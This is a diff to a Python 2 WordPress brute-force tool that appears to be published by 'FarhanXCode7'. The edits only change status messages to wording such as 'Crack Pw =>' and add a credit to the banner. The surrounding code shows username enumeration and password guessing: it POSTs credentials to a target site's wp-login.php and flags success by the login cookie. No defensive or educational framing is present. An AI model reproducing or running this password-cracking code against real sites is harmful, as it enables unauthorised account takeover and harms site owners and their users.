@@ -98,7 +98,7 @@ class WordPress_priv8Bf(object):
             Username = usgen
             time.sleep(1)
             print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
-                  ' Enumeration Username:  ' + self.g + str(Username) + self.g + ' [MANTEP]'
+                  ' Found Username:  ' + self.g + str(Username) + self.g + ' [USER KETEMU]'
         else:
             try:
                 Username = raw_input(self.c + '       [' + self.y + '*' + self.c + ']' + self.w +
@@ -172,6 +172,13 @@ class WordPress_priv8Bf(object):
              IND } JAVA { SEC                 github.com/FarhanXCode7 
 
                   Note! : Resiko Ditanggung Sendiri 
+                  
+                  
+                  
+                  
+                  
+                  
+               Powered By: FarhanXCode7
     """
         for N, line in enumerate(x.split("\n")):
             sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
@@ -218,7 +225,7 @@ class WordPress_priv8Bf(object):
         url = "http://" + site + '/wp-login.php'
         GoT = requests.post(url, data=post, headers=agent, timeout=10)
         print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
-              ' Testing: ' + self.y + passwd
+              ' Crack Pw =>: ' + self.y + passwd
         if 'wordpress_logged_in_' in str(GoT.cookies):
             print self.c + '       [' + self.y + '+' + self.c + '] ' + \
                   self.y + site + ' ' + self.y + 'username: ' + self.g \
